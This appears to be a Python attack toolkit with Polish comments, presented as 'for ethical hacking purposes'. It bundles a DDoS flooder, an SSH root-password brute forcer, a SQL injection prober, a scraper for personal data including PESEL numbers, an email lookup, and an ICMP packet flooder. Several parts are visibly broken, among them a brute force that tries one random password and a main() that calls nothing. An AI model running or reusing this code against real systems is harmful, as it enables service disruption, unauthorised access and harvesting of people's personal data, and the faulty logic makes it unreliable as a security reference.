import socket
import aiohttp
import asyncio
import threading
import paramiko
import re
import argparse
import logging
import random
import os
from bs4 import BeautifulSoup
from holehe.core import *
from holehe.localuseragent import *
from scapy.all import *

# Stałe
TIMEOUT = 0.5

# Lista serwerów DNS (możesz dowolnie zmieniać lub dodawać inne)
DNS_SERVERS = ['1.1.1.1', '1.0.0.1', '8.8.8.8', '8.8.4.4']

# Inicjalizacja loggera
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def validate_ip_address(ip):
    """
    Funkcja do walidacji adresu IP przy użyciu modułu re.
    """
    pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    return re.match(pattern, ip) is not None

async def scan_ports(target, start_port, end_port):
    """
    Funkcja asynchronicznie skanująca porty na podanym adresie IP w danym zakresie.
    """
    if not validate_ip_address(target):
        logging.error("Invalid IP address.")
        return []

    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            async with aiohttp.ClientSession() as session:
                url = f"http://{target}:{port}"
                async with session.get(url, timeout=TIMEOUT) as response:
                    if response.status == 200:
                        open_ports.append(port)
                        logging.info(f"Found open port: {port}")
        except aiohttp.ClientError:
            pass
    return open_ports

async def ddos_attack(target, num_requests=None):
    """
    Funkcja asynchronicznie przeprowadzająca atak DDoS na podany cel.
    """
    if not validate_ip_address(target):
        logging.error("Invalid IP address.")
        return

    num_requests = num_requests or random.randint(100, 1000)

    async def send_request():
        try:
            async with aiohttp.ClientSession() as session:
                dns_server = random.choice(DNS_SERVERS)
                url = f"http://{target}"
                async with session.get(url, headers={'Host': dns_server}, timeout=TIMEOUT) as response:
                    logging.info(f"Sent request to target using DNS server: {dns_server}")
        except aiohttp.ClientError as e:
            logging.error(f"Failed to send request to target: {e}")

    tasks = []
    for _ in range(num_requests):
        tasks.append(asyncio.create_task(send_request()))

    await asyncio.gather(*tasks)

async def brute_force(target, passwords_file):
    """
    Funkcja asynchronicznie przeprowadzająca atak brute force na SSH z wykorzystaniem podanej listy haseł.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    passwords_file = os.path.join("data", passwords_file)
    if os.path.exists(passwords_file):
        try:
            with open(passwords_file, "r") as f:
                passwords = f.readlines()
                if passwords:
                    password = random.choice(passwords).strip()
                    try:
                        await asyncio.to_thread(ssh.connect, target, username="root", password=password)
                        logging.info(f"Brute force successful. Found password: {password}")
                        return password
                    except Exception as e:
                        logging.error(f"Brute force unsuccessful: {e}")
                else:
                    logging.warning("Empty passwords file.")
        except Exception as e:
            logging.error(f"Error reading passwords file: {e}")
            sys.exit(1)
    else:
        logging.error("Passwords file not found.")
        sys.exit(1)

    logging.warning("Brute force unsuccessful. Password not found.")
    return None

async def sql_injection(target_url, sql_file):
    """
    Funkcja asynchronicznie przeprowadzająca test SQL injection na podanej stronie internetowej.
    """
    sql_file = os.path.join("data", sql_file)
    if os.path.exists(sql_file):
        try:
            with open(sql_file, "r") as f:
                sql_queries = f.readlines()
                if sql_queries:
                    for query in sql_queries:
                        query = query.strip()
                        url = f"{target_url}?id={query}"
                        try:
                            async with aiohttp.ClientSession() as session:
                                async with session.get(url) as response:
                                    if "error" in await response.text() or "database" in await response.text():
                                        logging.info(f"SQL injection vulnerability found. Query: {repr(query)}, Response: {await response.text()}")
                                        return query, await response.text()
                        except Exception as e:
                            logging.error(f"SQL injection test failed: {e}")
                else:
                    logging.warning("Empty SQL file.")
        except Exception as e:
            logging.error(f"Error reading SQL file: {e}")
            sys.exit(1)
    else:
        logging.error("SQL file not found.")
        sys.exit(1)

    logging.warning("SQL injection vulnerability not found.")
    return None

async def personal_data_scan(target_url):
    """
    Funkcja asynchronicznie przeprowadzająca skanowanie danych osobowych na podanej stronie internetowej.
    """
    patterns = {
        "Name": r"\b[A-Z][a-z]+\s[A-Z][a-z]+\b",
        "Email": r"\b[\w.-]+@[a-zA-Z]+\.[a-zA-Z]{2,3}\b",
        "Phone Number": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
        "Date of Birth": r"\b\d{1,2}/\d{1,2}/\d{4}|\d{4}-\d{1,2}-\d{1,2}\b",
        "PESEL": r"\b\d{11}\b"
    }

    try:
        async with aiohttp.ClientSession() as session:
            dns_server = random.choice(DNS_SERVERS)
            async with session.get(target_url, headers={'Host': dns_server}) as response:
                soup = BeautifulSoup(await response.text(), 'html.parser')
                found_data = {}

                for key, pattern in patterns.items():
                    matches = soup.find_all(text=re.compile(pattern))
                    if matches:
                        found_data[key] = [match.strip() for match in matches]

                if found_data:
                    logging.info("Personal data found on the target website:")
                    for category, data in found_data.items():
                        logging.info(f"{category}: {data}")
                else:
                    logging.info("No personal data found on the target website.")

    except Exception as e:
        logging.error(f"An error occurred during personal data scan: {e}")

async def check_email(email):
    """
    Funkcja asynchronicznie sprawdzająca adres e-mail przy użyciu modułu holehe.
    """
    results = []
    async with aiohttp.ClientSession() as client:
        await rocketreach(email, client, results)
        # Dodaj więcej funkcji z holehe, jeśli chcesz sprawdzać na innych platformach
    return results

def send_icmp_packets(target, num_packets):
    """
    Funkcja wysyłająca pakiety ICMP do celu.
    """
    if not validate_ip_address(target):
        logging.error("Invalid IP address.")
        return

    for _ in range(num_packets):
        pkt = IP(dst=target)/ICMP()
        send(pkt)

def main():
    parser = argparse.ArgumentParser(description='Tool for ethical hacking purposes.')
    parser.add_argument('-t', '--target', dest='target', help='Target IP address or URL')
    # Dodaj więcej argumentów według potrzeb
    args = parser.parse_args()

    if args.target:
        target = args.target
        # Wywołaj odpowiednie funkcje w zależności od celu

if __name__ == "__main__":
    main()
